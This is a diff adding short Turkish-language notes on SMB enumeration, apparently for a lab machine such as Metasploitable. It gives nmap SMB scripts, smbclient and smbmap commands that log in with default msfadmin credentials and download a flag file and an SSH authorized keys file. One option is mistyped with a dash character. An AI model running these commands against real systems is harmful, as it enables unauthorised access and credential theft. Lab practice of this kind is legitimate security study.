@@ -1,0 +1,16 @@
+#SMB üzerinde ki açıklar için NMAP ile tarama yapılabilir.
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
+
+#SMB Client Kullanım.
+smbclient — no-pass //192.168.187.153/tmp
+
+Hata alınır ise bu şekilde kullanılabilir
+smbclient //192.168.187.153/tmp -U msfadmin --option='client min protocol=NT1'
+Enter WORKGROUP\msfadmin's password: 
+                                                                             
+//192.168.187.153/tmp --no-pass --option='client min protocol=NT1'
+
+SMBMap üzerinden gerçekleştirilecek kullanılmlar.
+smbmap -H 192.168.187.153 -u msfadmin -p msfadmin -R 
+smbmap -H 192.168.187.153 -u msfadmin -p msfadmin --download /msfadmin/msfadmin/h@ckr00t.txt
+smbmap -H 192.168.187.153 -u msfadmin -p msfadmin --download /msfadmin/msfadmin/sshauthorised.keys
